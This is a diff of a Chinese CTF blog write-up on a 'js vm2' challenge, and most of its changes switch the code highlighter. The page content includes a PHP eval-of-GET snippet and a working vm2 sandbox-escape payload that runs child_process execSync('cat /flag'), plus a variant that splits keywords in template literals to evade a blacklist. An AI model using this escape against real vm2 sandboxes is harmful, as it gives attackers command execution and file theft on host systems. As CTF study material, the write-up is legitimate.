@@ -29,7 +29,15 @@
     
     
       
-      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/base16/-gigavolt.min.css" />
+      
+        
+          
+          
+          
+        
+        <link  rel="stylesheet" href="https://cdn.staticfile.org/prism/1.22.0/themes/prism-funky.min.css" />
+      
+      
     
   
 
@@ -191,7 +199,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      268 字
+      261 字
     </span>
   
 
@@ -241,14 +249,14 @@
               <h2 id="js-vm2"><a href="#js-vm2" class="headerlink" title="js vm2"></a>js vm2</h2><p><img src="https://sc01.alicdn.com/kf/H375cdea26ac54e8c8ee6dfdf19c4a90ag.png" srcset="/img/loading.gif" alt="01.png">      </p>
 <p>下面两个demo     </p>
 <p>看下<code>run.php</code>     </p>
-<div class="hljs"><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
-<span class="hljs-keyword">if</span>( array_key_exists( <span class="hljs-string">&quot;code&quot;</span>, $_GET ) &amp;&amp; $_GET[ <span class="hljs-string">&#x27;code&#x27;</span> ] != <span class="hljs-literal">NULL</span> ) &#123;
-    $code = $_GET[<span class="hljs-string">&#x27;code&#x27;</span>];
-    <span class="hljs-keyword">echo</span> <span class="hljs-keyword">eval</span>(code);
-&#125; <span class="hljs-keyword">else</span> &#123;
-    highlight_file(<span class="hljs-keyword">__FILE__</span>);
-&#125;
-<span class="hljs-meta">?&gt;</span></code></pre></div></code></pre>
+<pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">array_key_exists</span><span class="token punctuation">(</span> <span class="token double-quoted-string string">"code"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token single-quoted-string string">'code'</span> <span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token keyword">eval</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token delimiter important">?></span></span></code></pre></code></pre>
 <p>试了下，感觉什么都执行不了     </p>
 <p>前面提示说<code>真的是 PHP 嘛</code><br>难道不是PHP      </p>
 <p>看下WP   </p>
@@ -256,7 +264,7 @@
 <p>js还不会，先简单记一下吧，等学学再回来看看     </p>
 <p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/207291"><code>js  vm2沙箱逃逸</code></a>      </p>
 <p>payload:   </p>
-<div class="hljs"><pre><code>code = &#39;(&#39; + function()&#123;
+<pre><code>code = &#39;(&#39; + function()&#123;
     TypeError.prototype.get_process = f=&gt;f.constructor(&quot;return process&quot;)();
     try&#123;
         Object.preventExtensions(Buffer.from(&quot;&quot;)).a = 1;
@@ -268,16 +276,16 @@ try&#123;
     console.log(new VM().run(code));
 &#125;catch(x)&#123;
     console.log(x);
-&#125;</code></pre></div>
+&#125;</code></pre>
 <p>绕过：<code>[&#39;process&#39;, &#39;exec&#39;, &#39;constructor&#39;, &#39;prototype&#39;, &#39;Function&#39;, &#39;&quot;&#39;, &#39;&#39;&#39;]</code>      </p>
-<div class="hljs"><pre><code>?code=(function ()&#123;
+<pre><code>?code=(function ()&#123;
     TypeError[`$&#123;`$&#123;`prototyp`&#125;e`&#125;`][`$&#123;`$&#123;`get_proces`&#125;s`&#125;`] = f=&gt;f[`$&#123;`$&#123;`constructo`&#125;r`&#125;`](`$&#123;`$&#123;`return proces`&#125;s`&#125;`)();
     try&#123;
         Object.preventExtensions(Buffer.from(``)).a = 1;
     &#125;catch(e)&#123;
         return e[`$&#123;`$&#123;`get_proces`&#125;s`&#125;`](()=&gt;&#123;&#125;).mainModule[`$&#123;`$&#123;`requir`&#125;e`&#125;`](`$&#123;`$&#123;`child_proces`&#125;s`&#125;`)[`$&#123;`$&#123;`exe`&#125;cSync`&#125;`](`cat /flag`).toString();
     &#125;
-&#125;)()</code></pre></div>
+&#125;)()</code></pre>
 
             </div>
             <hr>
@@ -422,6 +430,8 @@ try&#123;
 
 
 
+  
+    
   
 
 
